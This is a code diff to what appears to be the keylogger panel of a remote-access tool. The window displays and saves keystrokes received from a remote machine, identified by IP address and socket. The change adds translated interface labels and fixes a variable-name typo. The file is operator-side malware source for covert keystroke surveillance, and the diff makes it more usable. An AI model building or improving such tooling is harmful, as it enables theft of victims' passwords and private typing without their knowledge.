@@ -9,6 +9,12 @@ import datetime
 from main_ui import Ui_Form
 
 from libs.modechat import get
+from libs.language import Translate
+
+# Multi Lang
+translate = Translate()
+_ = lambda _word: translate.word(_word)
+
 
 class mainPopup(QWidget, Ui_Form):
     def __init__(self, args):
@@ -20,7 +26,9 @@ class mainPopup(QWidget, Ui_Form):
         self.ipAddress = args['ipAddress']
         self.assets = args['assets']
 
-        self.setWindowTitle('Keystrokes from - %s - Socket #%s' % (self.ipAddress, self.socket))
+        self.setWindowTitle(_('MKEYLOGGER_TITLE'))
+
+        self.set_language()
 
         self.stopKeyloggingButton.setChecked(True)
 
@@ -30,6 +38,12 @@ class mainPopup(QWidget, Ui_Form):
         self.saveButton.clicked.connect(self.save)
 
         self.last_title = ''
+
+    def set_language(self):
+        self.startKeyloggingButton.setText(_('MKEYLOGGER_START'))
+        self.stopKeyloggingButton.setText(_('MKEYLOGGER_STOP'))
+        self.saveButton.setText(_('MKEYLOGGER_SAVE_AS'))
+        self.autoSaveButton.setText(_('MKEYLOGGER_AUTO_SAVE'))
 
     def start_logging(self):
 
@@ -52,12 +66,12 @@ class mainPopup(QWidget, Ui_Form):
             self.startKeyloggingButton.setChecked(True)
 
     def save(self):
-        file_name = QFileDialog.getSaveFileName(self, "Save To File", "", filter="html (*.html)")
+        file_name = QFileDialog.getSaveFileName(self, _('MKEYLOGGER_SAVE_TO'), "", filter="html (*.html)")
         if file_name:
-            open(file_name, 'w').write(self.keystokesText.toHtml())
+            open(file_name, 'w').write(self.keystrokesText.toHtml())
 
     def auto_save(self):
-        open(self.keystrokes_path, 'w').write(self.keystokesText.toHtml())
+        open(self.keystrokes_path, 'w').write(self.keystrokesText.toHtml())
 
     def set_logs(self):
         try:
@@ -65,9 +79,9 @@ class mainPopup(QWidget, Ui_Form):
             result = literal_eval(data)
             for k in result:
                 if k != self.last_title:
-                    self.keystokesText.append('<br><p align="center" style="background-color: #0F2D40; color: #2ecc71;">%s</p><br>' % k)
-                self.keystokesText.moveCursor(QTextCursor.End)
-                self.keystokesText.insertHtml(result[k])
+                    self.keystrokesText.append('<br><p align="center" style="background-color: #0F2D40; color: #2ecc71;">%s</p><br>' % k)
+                self.keystrokesText.moveCursor(QTextCursor.End)
+                self.keystrokesText.insertHtml(result[k])
                 self.last_title = k
             if self.autoSaveButton.isChecked():
                 self.auto_save()
